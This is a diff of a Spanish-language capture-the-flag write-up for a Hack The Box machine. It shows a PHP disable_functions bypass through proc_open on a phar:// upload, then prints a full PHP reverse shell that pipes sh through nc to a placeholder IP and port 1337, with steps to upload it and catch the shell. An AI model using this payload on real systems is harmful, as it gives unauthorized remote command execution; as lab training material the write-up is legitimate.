@@ -230,7 +230,40 @@ Volveremos a cargar el archivo del *phpinfo* y le pasamos la URL a la herramient
 dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/6efa841f20458709d7263614ce1eb387/test.pwned/test
 ```
 
-Devolviendonos como resultado que falata la funcio `proc_open` de la cual nos podremos aprovechar para la eje
+Devolviéndonos como resultado que falta la función `proc_open` de la cual nos podremos aprovechar para la ejecución remota de comandos.
+Así que buscaremos en internet como poder entablarnos una reverse shell aprovechándonos de esta función.
+Encontramos una reverse shell en Github
+```php
+<?php
+$descriptorspec = array(
+   0 => array("pipe", "r"),  
+   1 => array("pipe", "w"),  
+   2 => array("file", "/tmp/error-output.txt", "a") 
+);
+
+$cwd = '/tmp';
+$env = array('some_option' => 'aeiou');
+
+$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
+
+if (is_resource($process)) {
+
+    fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 1337 >/tmp/f');
+    fclose($pipes[0]);
+    echo stream_get_contents($pipes[1]);
+    fclose($pipes[1]);
+    $return_value = proc_close($process);
+
+    echo "command returned $return_value\n";
+}
+?>
+```
+
+Tendremos que modificar la IP y el puerto.
+A continuación lo comprimimos de nuevo, cambiamos la extensión y lo subimos.
+Nos pondremos en escucha en el puerto indicado y recibiremos una reverse shell
+
+
 
 
 
